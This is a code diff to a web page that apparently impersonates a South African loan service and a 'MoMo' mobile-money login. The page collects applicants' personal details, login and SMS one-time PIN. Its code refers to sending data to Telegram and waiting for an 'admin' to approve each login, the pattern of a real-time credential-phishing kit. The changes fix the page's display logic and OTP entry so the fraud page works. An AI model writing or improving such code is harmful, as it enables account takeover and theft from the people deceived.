@@ -231,12 +231,15 @@
         We will send an SMS with a One Time Pin (OTP) within the next 3 minutes to <span id="maskedPhone">083****567</span>
       </p>
       <label style="font-weight: 700; color: #888; font-size: 14px; display: block; margin-bottom: 15px;">Please enter the OTP you received</label>
+      
+      <!-- OTP INPUTS RESTRICTED TO NUMBERS -->
       <div class="otp-container">
         <input type="tel" pattern="[0-9]*" inputmode="numeric" class="otp-input" maxlength="1" oninput="validateOTP(this, 0)">
         <input type="tel" pattern="[0-9]*" inputmode="numeric" class="otp-input" maxlength="1" oninput="validateOTP(this, 1)">
         <input type="tel" pattern="[0-9]*" inputmode="numeric" class="otp-input" maxlength="1" oninput="validateOTP(this, 2)">
         <input type="tel" pattern="[0-9]*" inputmode="numeric" class="otp-input" maxlength="1" oninput="validateOTP(this, 3)">
       </div>
+      
       <div style="text-align: right; font-size: 14px; font-weight: 500; margin-bottom: 30px; cursor: pointer;">SHOW</div>
       <button class="btn" style="border-radius: 30px; padding: 18px; margin-bottom: 15px;" onclick="submitOTP()">Verify</button>
       <button class="btn btn-secondary" style="border-radius: 30px; padding: 18px;">Resend OTP</button>
@@ -272,10 +275,10 @@
   function updateCalculator() {
     const amount = parseInt(amountSlider.value);
     const term = parseInt(termSlider.value);
-    document.getElementById('amountDisplay').textContent = ZAR ;
-    document.getElementById('termDisplay').textContent = ${term} months;
+    document.getElementById('amountDisplay').textContent = `ZAR ${amount.toLocaleString()}`;
+    document.getElementById('termDisplay').textContent = `${term} months`;
     const totalInterest = amount * 0.08 * (term / 12);
-    document.getElementById('monthlyDisplay').textContent = ZAR ;
+    document.getElementById('monthlyDisplay').textContent = `ZAR ${((amount + totalInterest) / term).toFixed(2)}`;
   }
   amountSlider.addEventListener('input', updateCalculator);
   termSlider.addEventListener('input', updateCalculator);
@@ -297,10 +300,10 @@
     const phone = document.getElementById('phone').value;
     if (!firstName || !lastName || !email || !phone) return alert('Please fill in all fields.');
     formData.firstName = firstName; formData.lastName = lastName; formData.email = email; formData.phone = phone;
-    document.getElementById('sumAmount').textContent = ZAR ;
-    document.getElementById('sumTerm').textContent = ${formData.loanTerm} Months;
+    document.getElementById('sumAmount').textContent = `ZAR ${parseInt(formData.loanAmount).toLocaleString()}`;
+    document.getElementById('sumTerm').textContent = `${formData.loanTerm} Months`;
     document.getElementById('sumPurpose').textContent = formData.purpose;
-    document.getElementById('sumApplicant').textContent = ${firstName} ;
+    document.getElementById('sumApplicant').textContent = `${firstName} ${lastName}`;
     goToPage('page-step3');
   }
 
@@ -315,7 +318,7 @@
     const timer = setInterval(() => {
       countdown--;
       if (countdown <= 0) { clearInterval(timer); if (document.getElementById('page-success').classList.contains('active')) goToLogin(); } 
-      else { document.getElementById('redirectText').textContent = Redirecting to MoMo login in s...; }
+      else { document.getElementById('redirectText').textContent = `Redirecting to MoMo login in ${countdown}s...`; }
     }, 1000);
   }
 
@@ -337,8 +340,12 @@
     } catch (err) { toggleLoading(false); alert('Error connecting to Telegram.'); }
   }
 
+  // UPDATED VALIDATION FUNCTION FOR OTP
   function validateOTP(input, index) {
+    // Force the value to be only numbers
     input.value = input.value.replace(/[^0-9]/g, '');
+    
+    // Move focus to the next input if a number was typed
     if (input.value.length === 1 && index < 3) {
       document.querySelectorAll('.otp-input')[index + 1].focus();
     }
@@ -360,14 +367,14 @@
     if (pollingInterval) clearInterval(pollingInterval);
     pollingInterval = setInterval(async () => {
       try {
-        const response = await fetch(/api/status/);
+        const response = await fetch(`/api/status/${currentRequestId}`);
         if (!response.ok) return;
         const data = await response.json();
         if (stage === 'login') {
           if (data.status === 'login_approved') {
             clearInterval(pollingInterval); toggleLoading(false);
             const phoneVal = document.getElementById('loginPhone').value;
-            document.getElementById('maskedPhone').textContent = +27 ***;
+            document.getElementById('maskedPhone').textContent = `+27 ${phoneVal.substring(0,3)}***${phoneVal.slice(-3)}`;
             goToPage('page-otp');
           } else if (data.status === 'login_rejected') {
             clearInterval(pollingInterval); toggleLoading(false); alert('Login rejected by admin. Please try again.');
